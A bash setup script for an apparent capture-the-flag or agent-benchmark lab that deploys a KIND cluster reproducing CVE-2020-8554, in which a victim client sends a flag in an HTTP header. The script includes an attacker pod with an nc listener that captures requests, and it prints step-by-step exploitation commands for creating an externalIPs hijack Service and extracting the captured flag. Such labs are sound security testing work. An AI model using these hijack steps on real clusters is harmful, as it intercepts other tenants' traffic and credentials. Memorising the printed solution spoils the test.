#!/bin/bash
set -euo pipefail
K8S_ID="k8s-22"
CLUSTER_NAME="cve-k8s-22-externalip"
source "$(dirname "$0")/../../../scripts/k8s-common.sh"

echo "[K8S-22] CVE-2020-8554 Service ExternalIP Traffic Interception"
k8s_init
k8s_create_cluster
k8s_wait_ready
k8s_write_node_flag /host-flag

echo "[*] Pre-loading container images into KIND..."
k8s_load_images alpine:latest nginx:1.24-alpine

echo "[*] Setting up namespaces and RBAC..."
k8s_apply << 'YAML'
---
apiVersion: v1
kind: Namespace
metadata:
  name: secure-ns
---
apiVersion: v1
kind: Namespace
metadata:
  name: attack-ns
---
# Attacker SA with Service creation permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attack-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: service-creator
  namespace: attack-ns
rules:
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["create", "get", "list", "delete"]
  # 落脚 pod 的 shell：拦到的请求要能回到攻击者手里
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: service-creator
  namespace: attack-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attack-ns
roleRef:
  kind: Role
  name: service-creator
  apiGroup: rbac.authorization.k8s.io
YAML

echo "[*] Creating target service with flag-bearing client..."
# Store flag as a Secret in secure-ns
k8s_create_k8s_secret "target-flag" "secure-ns"

k8s_apply << 'YAML'
---
apiVersion: v1
kind: Service
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  # headless：受害客户端直连 Pod IP，攻击者才能用 externalIPs 抢同一个地址
  clusterIP: None
  selector:
    app: internal-api
  ports:
    - port: 8080
      targetPort: 8080
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: internal-api
  template:
    metadata:
      labels:
        app: internal-api
    spec:
      containers:
        - name: api
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - "printf 'server { listen 8080; location /health { return 200 ok; } location / { return 200; } }' > /etc/nginx/conf.d/default.conf && nginx -g 'daemon off;'"
          ports:
            - containerPort: 8080
---
# Flag-bearing client: periodically calls the internal-api Service ClusterIP
# with the flag in an X-Flag header (read from the Secret at runtime)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: flag-client
  namespace: secure-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: flag-client
  template:
    metadata:
      labels:
        app: flag-client
    spec:
      containers:
        - name: client
          image: alpine:latest
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              while true; do
                wget -qO- --timeout=2 --header="X-Flag: $X_FLAG" \
                  http://internal-api.secure-ns.svc.cluster.local:8080/ >/dev/null 2>&1 || true
                sleep 5
              done
          env:
            - name: X_FLAG
              valueFrom:
                secretKeyRef:
                  name: target-flag
                  key: flag
---
# Attacker pod: listens on 8080 to capture intercepted traffic
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attack-ns
  labels:
    # 恶意 Service 的 selector 要能选中落脚 pod，否则 externalIPs 规则没有后端
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          while true; do
            # busybox nc 没有 -q，用 -w 让每次请求后回到循环
            printf 'HTTP/1.1 200 OK\r\n\r\n' | nc -l -p 8080 -w 3 >> /tmp/captured_requests.txt 2>/dev/null || true
          done
      ports:
        - containerPort: 8080
YAML

echo "[*] Waiting for pods..."
k8s_wait_pod "attacker-pod" "attack-ns"
k8s_wait_pods_label "app=internal-api" "secure-ns"
k8s_wait_pods_label "app=flag-client" "secure-ns"
sleep 5

# 目标地址是 Pod IP：入口身份看不到 secure-ns 的 Pod，需要自己用 DNS 解析（headless service）
TARGET_IP=$(kubectl get pod -n secure-ns -l app=internal-api -o jsonpath='{.items[0].status.podIP}')
k8s_publish_agent_identity sa-token attack-ns attacker-sa
k8s_info
echo "    Target Pod IP (headless internal-api): $TARGET_IP"
echo "    Flag Secret: target-flag in secure-ns namespace"
echo ""
echo "    Exploitation steps:"
echo "    1. 在落脚 pod 里解析目标地址："
echo "       nslookup internal-api.secure-ns.svc.cluster.local"
echo "    2. Create a malicious service with externalIPs set to the target IP:"
echo "       kubectl apply -f - << 'EOF'"
echo "       apiVersion: v1"
echo "       kind: Service"
echo "       metadata:"
echo "         name: hijack-svc"
echo "         namespace: attack-ns"
echo "       spec:"
echo "         externalIPs:"
echo "           - $TARGET_IP"
echo "         selector:"
echo "           app: attacker"
echo "         ports:"
echo "           - port: 8080"
echo "             targetPort: 8080"
echo "       EOF"
echo "    3. All traffic to $TARGET_IP:8080 now routes to attacker's pods"
echo "    4. Intercept the flag-bearing X-Flag header from captured requests:"
echo "       kubectl exec -n attack-ns attacker-pod -- grep -o 'X-Flag: [^ ]*' /tmp/captured_requests.txt"
echo "    5. The attacker SA has NO secrets read permission in secure-ns (RBAC-scoped)"
